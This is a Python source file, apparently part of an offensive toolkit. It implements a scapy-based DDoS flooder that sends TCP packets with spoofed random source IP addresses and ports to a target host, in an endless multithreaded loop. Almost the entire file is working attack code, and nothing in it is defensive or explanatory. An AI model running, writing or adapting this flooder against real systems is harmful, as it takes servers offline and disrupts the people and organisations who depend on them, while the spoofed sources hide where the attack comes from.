#! /usr/bin/python

import random
from scapy.all import *
import threading
import socket
import sys
from urllib.parse import urlparse
import colors
import time


class DDoS(object):

    def __init__(self, url, ip, start_port, end_port, dport, threads,
                 interval):

        if url is not None and ip is not None:
            colors.error('Please provide either the URL or the IP address...')
            sys.exit(1)

        if ip is not None:
            self.target_ip = ip
        elif url is not None:
            self.target_ip = self.getIP(url)
        else:
            colors.error('Please provide URL or the IP address to attack...')

        if start_port is not None:
            if start_port > 0 and start_port < 65355:
                self.start_port = int(start_port)
        else:
            self.start_port = random.randint(1, 100)

        if end_port is not None:
            if end_port > 1 and end_port < 65356:
                self.end_port = int(end_port)
        else:
            self.end_port = random.randint(1000, 65355)

        if dport is None:
            self.dport = 80
        else:
            if dport < 65356 and dport > 0:
                self.dport = int(dport)
            else:
                colors.error('Please provide a valid destination port')
                sys.exit(1)

        if interval is not None:
            self.INTER = int(interval)
        else:
            self.INTER = 0.0001

        if threads is not None:
            threads = int(threads)
            self.threadValidator(threads)
        else:
            self.threads = 1

        self.number_of_packets = 0

    def threadValidator(self, threads):
        """
        Validates the number of threads
        """
        if threads > 100:
            choice = input('Are you sure you want to use {} threads...?'
                           'This can slow down your system.(Y/N)'
                           .format(threads))
            if choice == 'N' or choice == 'n':
                threads = int(input('>> Please enter the number of threads'
                                    ' you want to use...'))
                self.threadValidator(threads)
            else:
                self.threads = threads
        else:
            self.threads = threads

    @staticmethod
    def getIP(url):
        """
        Converts URL to IP
        """
        url = urlparse(url)
        return socket.gethostbyname(url.netloc)

    @staticmethod
    def generateIP():
        """
        Generates random IP address
        """
        ip = str(random.randint(1, 254)) + '.'\
            + str(random.randint(0, 255)) + '.'\
            + str(random.randint(0, 255)) + '.'\
            + str(random.randint(0, 255))

        return ip

    def generatePacket(self, ip, source_port):
        """
        Generates scapy packet
        """
        IP_PACKET = IP(src=ip, dst=self.target_ip)
        TCP_PACKET = TCP(sport=source_port, dport=self.dport)
        PKT = IP_PACKET/TCP_PACKET
        return PKT

    def sendPacket(self, packet):
        """
        Sends the generated packets to the destination
        """
        send(packet, inter=self.INTER, verbose=False)
        self.number_of_packets = self.number_of_packets + 1
        print('[+] Packets sent : {}'.format(self.number_of_packets), end='\r')

    def attack(self):

        while True:

            start_index = 0
            ip = self.generateIP()
            break_point = random.randint(1, 25)

            for _ in range(self.start_port, self.end_port):
                source_port = random.randint(self.start_port, self.end_port)
                newPacket = self.generatePacket(ip, source_port)
                self.sendPacket(newPacket)
                start_index = start_index + 1
                if start_index > break_point:
                    break

    def startAttack(self):

        try:
            colors.info('DDoS Attack on : {} : {}'
                        .format(self.target_ip, self.dport))

            colors.success('DDoS Attack started, press CTRL+C to stop...')

            t1 = time.time()

            threads = []

            for _ in range(self.threads):
                newThread = threading.Thread(target=self.attack)
                threads.append(newThread)
                newThread.start()

            for thread in threads:
                thread.join()

        except KeyboardInterrupt:
            t2 = time.time()
            colors.success('Completed in time : {}'.format(t2-t1))
